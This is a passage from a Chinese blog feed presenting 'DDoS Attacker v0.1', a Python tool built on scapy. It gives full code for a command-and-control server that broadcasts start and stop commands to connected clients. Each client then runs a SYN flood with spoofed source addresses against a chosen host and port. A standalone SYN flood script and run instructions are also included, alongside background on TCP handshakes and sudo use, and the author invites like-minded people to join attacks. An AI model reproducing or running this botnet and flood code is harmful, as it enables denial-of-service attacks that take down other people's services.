class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">socketList = []</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">5. 第五步，实现发送命令的函数</span></span><br><span class="line"><span class="string">便利socketList，将每个socket都调用一次send将命令发送出去</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># def sendCmd(cmd):</span></span><br><span class="line"><span class="comment">#     print("Send command......")</span></span><br><span class="line"><span class="comment">#     for sock in socketList:</span></span><br><span class="line"><span class="comment">#         sock.send(cmd.encode = ('utf-8'))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    print(<span class="string">"Send command......"</span>)</span><br><span class="line">    <span class="keyword">for</span> sock <span class="keyword">in</span> socketList:</span><br><span class="line">        sock.send(cmd.encode(<span class="string">'UTF-8'</span>))    </span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">4. 第四步,实现等待客户端的函数</span></span><br><span class="line"><span class="string">循环等待客户端连接，并判断socket是否在socketList已存储过，没有则添加</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waitConnect</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sock, addr = s.accept()</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">not</span> <span class="keyword">in</span> socketList:</span><br><span class="line">            socketList.append(sock)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 第一步，编写主函数</span></span><br><span class="line"><span class="string">创建socket，绑定所有网络地址和58868端口并开始监听；</span></span><br><span class="line"><span class="string">新开一个线程等待客户端的连接，以免阻塞我们输入命令（注意）</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">58868</span>))</span><br><span class="line">    s.listen(<span class="number">1024</span>)</span><br><span class="line">    t = Thread(target=waitConnect, args = (s, ))</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2. 第二步</span></span><br><span class="line"><span class="string">    将新开的线程中连接进来的socket添加到一个list中</span></span><br><span class="line"><span class="string">    并检查一下socket长度，需要至少一个客户端连接</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(<span class="string">'Wait at least a client connection!'</span>)</span><br><span class="line">    <span class="comment"># 若没有客户端连接，则</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> len(socketList):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">'It has been a client connection!'</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    3. 第三步</span></span><br><span class="line"><span class="string">    循环等待输入命令，输入后判断是否符合命令格式的基本要求（自己定）</span></span><br><span class="line"><span class="string">    满足，则把命令发送到所有客户端</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"="</span> * <span class="number">50</span>)</span><br><span class="line">        print(<span class="string">'The command format:"#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;"'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 等待输入的命令</span></span><br><span class="line">        cmd_str = input(<span class="string">'Please input command: '</span>)</span><br><span class="line">        <span class="keyword">if</span> len(cmd_str):</span><br><span class="line">            <span class="keyword">if</span> cmd_str[<span class="number">0</span>] == <span class="string">'#'</span>:</span><br><span class="line">                sendCmd(cmd_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="客户端实现"><a href="#客户端实现" class="headerlink" title="客户端实现"></a>客户端实现</h3><p>同样，具体的实现思路和流程，都写在代码内的注释中。<br>客户端实现代码如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">isWorking = <span class="literal">False</span></span><br><span class="line">curProcess = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SYN flood attack</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synFlood</span><span class="params">(tgt,dPort)</span>:</span></span><br><span class="line">    print(<span class="string">'='</span>*<span class="number">100</span>)</span><br><span class="line">    print(<span class="string">'The syn flood is running!'</span>)</span><br><span class="line">    print(<span class="string">'='</span>*<span class="number">100</span>)</span><br><span class="line">    srcList = [<span class="string">'201.1.1.2'</span>,<span class="string">'10.1.1.102'</span>,<span class="string">'69.1.1.2'</span>,<span class="string">'125.130.5.199'</span>]</span><br><span class="line">    <span class="keyword">for</span> sPort <span class="keyword">in</span> range(<span class="number">1024</span>,<span class="number">65535</span>):</span><br><span class="line">        index = random.randrange(<span class="number">4</span>)</span><br><span class="line">        ipLayer = IP(src=srcList[index], dst=tgt)</span><br><span class="line">        tcpLayer = TCP(sport=sPort, dport=dPort,flags=<span class="string">"S"</span>)</span><br><span class="line">        packet = ipLayer / tcpLayer </span><br><span class="line">        send(packet)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">3. 第三步</span></span><br><span class="line"><span class="string">创建全部变量curProcess，用于判断是否有进程正在发起SYN泛洪攻击</span></span><br><span class="line"><span class="string">循环等待接受命令，接收到的数据类型为byte型，需要对其进行解码，解码后才为字符串</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># Process Command</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmdHandle</span><span class="params">(sock, parser)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> curProcess</span><br><span class="line">    <span class="comment"># TODO</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> count &lt;= <span class="number">20</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="comment"># 接收到的数据长度为0，则跳过后续内容，重新接收;</span></span><br><span class="line">        <span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'The data is empty'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收到的数据长度不为0，则判断是否有命令基本格式的特征#，满足则用ArgumentParser对象解析命令</span></span><br><span class="line">        <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">'#'</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># Parse Command</span></span><br><span class="line">                options = parser.parse_args(data[<span class="number">1</span>:].split())</span><br><span class="line">                m_host = options.host</span><br><span class="line">                m_port = options.port</span><br><span class="line">                m_cmd = options.cmd</span><br><span class="line"></span><br><span class="line">                <span class="string">'''</span></span><br><span class="line"><span class="string">                4. 第四步</span></span><br><span class="line"><span class="string">                判断命令参数解析后，是start命令还是stop命令</span></span><br><span class="line"><span class="string">                首先，判断当前是否有进程在运行，如果有进程判断进程是否存活</span></span><br><span class="line"><span class="string">                '''</span></span><br><span class="line">                <span class="comment"># DDoS Start Command</span></span><br><span class="line">                <span class="keyword">if</span> m_cmd.lower() == <span class="string">'start'</span>:</span><br><span class="line">                    <span class="comment"># 如果当前有进程正在发起SYN泛洪攻击，我们就先结束这个进程，并清空屏幕，再启动一个进程</span></span><br><span class="line">                    <span class="keyword">if</span> curProcess != <span class="literal">None</span> <span class="keyword">and</span> curProcess.is_alive():</span><br><span class="line">                        <span class="comment"># 结束进程</span></span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        curProcess = <span class="literal">None</span></span><br><span class="line">                        os.system(<span class="string">'clear'</span>)</span><br><span class="line">                    print(<span class="string">'The synFlood is already started'</span>)</span><br><span class="line">                    p = Process(target=synFlood, args=(m_host, m_port))</span><br><span class="line">                    p.start()</span><br><span class="line">                    curProcess = p</span><br><span class="line">                    <span class="comment"># TODO</span></span><br><span class="line">                    count = count+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># DDoS Stop Command</span></span><br><span class="line">                <span class="keyword">elif</span> m_cmd.lower() == <span class="string">'stop'</span>:</span><br><span class="line">                    <span class="keyword">if</span> curProcess.is_alive():</span><br><span class="line">                        curProcess.terminate()</span><br><span class="line">                        os.system(<span class="string">'clear'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                print(<span class="string">'Failed to perform the command!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1. 第一步  </span></span><br><span class="line"><span class="string">创建ArgumentParser对象，设置好需要解析的命令参数</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = argparse.ArgumentParser()</span><br><span class="line">    p.add_argument(<span class="string">'-H'</span>, dest = <span class="string">'host'</span>, type = str)</span><br><span class="line">    p.add_argument(<span class="string">'-p'</span>, dest = <span class="string">'port'</span>, type = int)</span><br><span class="line">    p.add_argument(<span class="string">'-c'</span>, dest = <span class="string">'cmd'</span>, type = str)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2. 第二步</span></span><br><span class="line"><span class="string">    创建socket，连接服务器</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="comment">## 测试用，连接本地的58868端口</span></span><br><span class="line">        s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">58868</span>))</span><br><span class="line">        print(<span class="string">'To connect server was success!'</span>)</span><br><span class="line">        print(<span class="string">'='</span> * <span class="number">50</span>)</span><br><span class="line">        cmdHandle(s, p)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'The network connected failed!'</span>)</span><br><span class="line">        print(<span class="string">'Please restart the script!'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h2><p>首先，我们规定了命令格式为：<code>#-H xxx.xxx.xxx.xxx -p xxxx -c &lt;start&gt;</code><br>e.g. <code>#-H 127.0.0.1 -p 8085 -c start</code>， <code> #-H 127.0.0.1 -p 8085 -c stop</code>  </p><p>首先执行server脚本，然后执行client脚本，等待连接，连接成功，即可在server端操控client进行攻击，示例如下：</p><ol><li><p>启动server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ddos_server_v0.1.py</span><br></pre></td></tr></table></figure></li><li><p>启动client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python ddos_client_v0.1.py</span><br></pre></td></tr></table></figure></li><li><p>连接成功<br><img src="http://119.3.78.82:8085/uploads/big/a375724463afb7b4eae2b0550a05764f.png" alt="连接成功"></p></li><li><p>进行攻击<br><img src="http://119.3.78.82:8085/uploads/big/6961dee0c77ba3b193f26447e4b7932f.png" alt="进行攻击"></p></li><li><p>停止攻击<br><img src="http://119.3.78.82:8085/uploads/big/b41516447d764d6b43914b984a656792.png" alt="停止攻击"></p></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1]Blog.csdn.net. (2019). 网络篇——七层协议、四层协议、TCP、HTTP、SOCKET、长短连接 - 袁伏彪 —— 共享，共赢 - CSDN博客. [online] Available at: <a href="https://blog.csdn.net/bjyfb/article/details/6682913" target="_blank" rel="noopener">https://blog.csdn.net/bjyfb/article/details/6682913</a> [Accessed 25 Oct. 2019].<br>[2]Jb51.net. (2019). Python实现DDoS. [online] Available at: <a href="https://www.jb51.net/article/155870.htm" target="_blank" rel="noopener">https://www.jb51.net/article/155870.htm</a> [Accessed 25 Oct. 2019].<br>[3]Blog.csdn.net. (2019). TCP包的类型 (SYN, FIN, ACK, PSH, RST, URG) - lqglqglqg的专栏 - CSDN博客. [online] Available at: <a href="https://blog.csdn.net/lqglqglqg/article/details/48714611" target="_blank" rel="noopener">https://blog.csdn.net/lqglqglqg/article/details/48714611</a> [Accessed 25 Oct. 2019].</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 开发 </tag>
            
            <tag> 开源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS_Attacker_0.1</title>
      <link href="/2019/10/25/DDoS-Attacker-0-1/"/>
      <url>/2019/10/25/DDoS-Attacker-0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DDoS-Attacker-v0-1"><a href="#DDoS-Attacker-v0-1" class="headerlink" title="DDoS Attacker v0.1"></a>DDoS Attacker v0.1</h1><h2 id="仓库链接"><a href="#仓库链接" class="headerlink" title="仓库链接"></a>仓库链接</h2><p><a href="https://github.com/satan1a/DDoS_Attacket_v0.1" target="_blank" rel="noopener">To<del>~</del>GitHub</a></p><h2 id="仓库结构"><a href="#仓库结构" class="headerlink" title="仓库结构"></a>仓库结构</h2><ul><li>ddos_client_v0.1.py —— DDoS客户端</li><li>ddos_server_v0.1.py —— DDoS服务端</li><li>test/ —— 存放单独模块的测试脚本</li><li>drafts/ ——  存放实现过程中的“草稿”</li><li>refer/ —— 存放原作者参考的代码</li></ul><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>首先实现SYN泛洪攻击（SYN Flood，是一直常用的DOS方式之一，通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽的攻击方式）。TCP三次握手的过程在下面补充。SYN攻击则是<strong>客户端向服务器发送SYN报文之后就不再响应服务器回应的报文，由于服务器在处理TCP请求时，会在协议栈留一块缓冲区来存储握手的过程，如果超过一定的时间没有接收到客户端的报文，那么本次连接在协议栈中存储的数据就会被丢弃。</strong> 攻击者如果利用这段时间发送了大量的连接请求，全部挂起在半连接状态，这样将不断消耗服务器资源，直到拒接服务。<br><img src="http://119.3.78.82:8085/uploads/big/84273932ac52825c1e6dd54a1155273e.png" alt="SYN报文请求过程"><br>上图，就是SYN报文请求过程。SYN是TCP包的一个类型，表示建立连接。ACK表示响应。</p><h2 id="补充：TCP三次握手以及TCP-IP族相关"><a href="#补充：TCP三次握手以及TCP-IP族相关" class="headerlink" title="补充：TCP三次握手以及TCP/IP族相关"></a>补充：TCP三次握手以及TCP/IP族相关</h2><h3 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h3><p>TCP/IP是一个协议族。因为TCP/IP协议包括TCP、IP、UDP、ICMP、RIP、TELNETFTP、SMTP、ARP、TFTP等许多协议，这些协议一起称为TCP/IP协议。<br>其中TCP全称为Transport Control Protocol, 传输控制协议。位于OSI参考模型的第4层，传输层。下图为TCP/IP对应OSI中的层以及功能介绍：<br><img src="http://119.3.78.82:8085/uploads/big/611cbd062a697a303a79e36adfecc21d.png" alt="TCP/IP对应OSI中的层以及功能"></p><h3 id="三次“建立”四次“分手”"><a href="#三次“建立”四次“分手”" class="headerlink" title="三次“建立”四次“分手”"></a>三次“建立”四次“分手”</h3><p>接下来，我们讲回TCP协议，TCP需要三次握手才能建立，断开断开连接需要四次握手，过程如下：<br><img src="http://119.3.78.82:8085/uploads/big/9e0734662000d35db1c5e9bf19175183.gif" alt="TCP三次连接四次分手"></p><p>TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接，以下详细的文字描述：</p><p> 位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p><p>第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；</p><p> 第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包；</p><p> 第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。</p><p> 完成三次握手，主机A与主机B开始传送数据。</p><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>Scapy是一个交互式数据包处理程序，可以用来发送、嗅探、解析和伪造网络数据包。本文环境为Ubuntu18.04LTS Desktop, VBox。可以使用apt或者pip安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># pip安装推荐推荐虚拟环境安装，安全也要讲究低耦合</span><br><span class="line">pip3 install scapy</span><br><span class="line"># 或者</span><br><span class="line">sudo apt-get install python-scapy</span><br><span class="line"># 运行scapy需要sudo权限</span><br><span class="line">sudo scapy</span><br><span class="line"># 运行会出现一些警告信息，先不用管</span><br></pre></td></tr></table></figure><h3 id="Tips-踩坑小提示："><a href="#Tips-踩坑小提示：" class="headerlink" title="Tips 踩坑小提示："></a>Tips 踩坑小提示：</h3><p>使用<code>sudo pip</code>安装，会安装到系统全局环境。如果我们激活虚拟环境后，再sudo pip，同样也会安装到系统全局环境，所以不要做按耳盗铃的事情哦~<br>但有时候，比如scapy，需要sudo权限执行，但<code>pip install scapy</code>安装后使用<code>sudo scapy</code>会显示command not found。但我们又不想把它安装到全局环境，那么解决办法是？</p><p>答案：sudo + 虚拟环境下的 bin/scapy。 e.g. <code>sudo ./venv/bin/scapy</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ ls</span><br><span class="line">activate      activate.fish  activate_this.py  easy_install      pip   pip3.6  python3    python-config  UTscapy</span><br><span class="line">activate.csh  activate.ps1   activate.xsh      easy_install-3.6  pip3  python  python3.6  scapy          wheel</span><br><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo scapy</span><br><span class="line">sudo: scapy: command not found</span><br><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo .&#x2F;scapy</span><br></pre></td></tr></table></figure><p>构造一个SYN包，发送测试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个SYN包</span><br><span class="line">&gt;&gt;&gt; pkt &#x3D; IP(src &#x3D; &quot;125.4.2.1&quot;,dst&#x3D;&quot;192.168.50.10&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;)</span><br><span class="line">&gt;&gt;&gt; send(pkt)</span><br></pre></td></tr></table></figure><p>发送测试，成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(prc37) satan1a@satan1a-VirtualBox:~&#x2F;projects&#x2F;python_projects&#x2F;ddos_attacker&#x2F;prc37&#x2F;bin$ sudo .&#x2F;scapy </span><br><span class="line">INFO: Can&#39;t import matplotlib. Won&#39;t be able to plot.</span><br><span class="line">INFO: Can&#39;t import PyX. Won&#39;t be able to use psdump() or pdfdump().</span><br><span class="line">WARNING: No route found for IPv6 destination :: (no default route?)</span><br><span class="line">INFO: Can&#39;t import python-cryptography v1.7+. Disabled WEP decryption&#x2F;encryption. (Dot11)</span><br><span class="line">INFO: Can&#39;t import python-cryptography v1.7+. Disabled IPsec encryption&#x2F;authentication.</span><br><span class="line">WARNING: IPython not available. Using standard Python shell instead.</span><br><span class="line">AutoCompletion, History are disabled.</span><br><span class="line">&gt;&gt;&gt; pkt &#x3D; IP(src &#x3D; &quot;125.4.2.1&quot;,dst&#x3D;&quot;192.168.50.10&quot;)&#x2F;TCP(dport&#x3D;80,flags&#x3D;&quot;S&quot;)</span><br><span class="line">&gt;&gt;&gt; send(pkt)</span><br><span class="line">.</span><br><span class="line">Sent 1 packets.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>但真的正确吗？<br>表面上看是成功了，但是这种方式就违背一条信息安全里很重要的原则：<strong>最小权限原则</strong>，即系统中所有的程序和特权用户应当仅获得完成相应工作所需的最少的权限。<br>使用上述的这种方式，我们使用sudo暂时向系统借了权限，执行虚拟环境里的程序，那么一个本来就要求更高权限的程序<strong>才能正常工作</strong>的程序，为什么要隔离在相对没有权限的环境里，然后又人为帮助它去翻过虚拟环境的高墙去做更高权限的事情呢？</p><h3 id="扩展：最小权限原则与sudo的使用"><a href="#扩展：最小权限原则与sudo的使用" class="headerlink" title="扩展：最小权限原则与sudo的使用"></a>扩展：最小权限原则与sudo的使用</h3><p>扩展：我们知道，sudo存在的一大目的，就是为了安全，尽可能地防止误操作和权限滥用。但同时我们也应该明白，什么时候需要给他较低权限，什么时候要给它较高权限，以及什么时候可以用sudo来暂时提高权限。<br>e.g. 在Ubuntu中，不是每个用户都可以使用sudo, 因为操作nginx等这种需要很高权限的服务时，只有指定的，<strong>被授予权限来暂时提高权限的用户</strong>才可以使用sudo来对nginx操作，这就是遵循了最小权限原则————权限最小，但能正常工作。<br>那么我们在虚拟环境下使用<code>pip install scapy</code>就违背了后者，不能正常工作。在这种情况下，root进不去虚拟环境，虚拟环境理论上又不能用sudo“越权”。所以，我们判断是否需要sudo安装的判断条件就是三个：  </p><ol><li>用户的权限最小化</li><li>程序能正常工作</li><li>如果同时满足的情况需要sudo，就可以直接使用sudo安装。</li></ol><h2 id="DDoS实现思路"><a href="#DDoS实现思路" class="headerlink" title="DDoS实现思路"></a>DDoS实现思路</h2><p>DDoS全称是Distributed Denial of Service，翻译成中文就是分布式拒绝服务，简单地说，就是调动多台主机一起发起攻击。<br>如何协同多台主机一起发起攻击呢？一种传统的方法就是控制多台傀儡机，同时进行SYN泛洪攻击，还有一种模式叫做HIVEMIND。  </p><blockquote><p>通过HIVEMIND模式，用户可以通过连接到一台 IRC(Internet Relay Chat services)服务器，当有用户发送命令，任何以HIVEMIND模式连接到IRC服务器的成员都会立即攻击该目标。  </p></blockquote><p>简单地说，一台主机可以作为Socket Server，其他主机作为Client，Client使用socket方式连接到Server，接收到信息后发起攻击。理想情况，就是志同道合的同志，可以随时加入攻击过程，只需执行客户端连接脚本即可开始攻击。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="实现一次SYN泛洪攻击"><a href="#实现一次SYN泛洪攻击" class="headerlink" title="实现一次SYN泛洪攻击"></a>实现一次SYN泛洪攻击</h3><p>具体步骤及介绍查看代码内注释，##注释内容为测试的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">synFlood</span><span class="params">(tgt, dport)</span>:</span></span><br><span class="line">    <span class="comment"># 伪造的源IP地址列表，同时也是保护攻击者的一种方式</span></span><br><span class="line">    srcList = [<span class="string">'201.1.1.2'</span>,<span class="string">'10.1.1.102'</span>,<span class="string">'69.1.1.2'</span>,<span class="string">'125.130.5.199'</span>]</span><br><span class="line">    <span class="comment"># 从不同的源端口发送</span></span><br><span class="line">    <span class="keyword">for</span> sPort <span class="keyword">in</span> range(<span class="number">1024</span>, <span class="number">65535</span>):</span><br><span class="line">        <span class="comment"># 随机选择主机地址</span></span><br><span class="line">        index = random.randrange(<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># 一个完整的TCP包由一个IP包和TCO包组成</span></span><br><span class="line">        <span class="comment"># 1. 构造IP包，设置源地址src和目的地址dst</span></span><br><span class="line">        ipLayer = IP(src=srcList[index], dst=tgt)</span><br><span class="line">        <span class="comment">## print("IP layer is " + str(ipLayer))</span></span><br><span class="line">        <span class="comment"># 2. 构造TCP包，设置发送源端口sport和目的源端口dport,flag值设为S表示发送SYN数据包</span></span><br><span class="line">        tcpLayer = TCP(sport=sPort, dport = dport, flags=<span class="string">"S"</span>)</span><br><span class="line">        <span class="comment">## print("TCP layer is " + str(tcpLayer))</span></span><br><span class="line">        <span class="comment"># 3. 构造完整TCP包，IP包/TCP包</span></span><br><span class="line">        packet = ipLayer / tcpLayer</span><br><span class="line">        send(packet)</span><br><span class="line">        print(<span class="string">"Sent"</span>)</span><br><span class="line">        <span class="comment">## print(sPort)</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    synFlood(<span 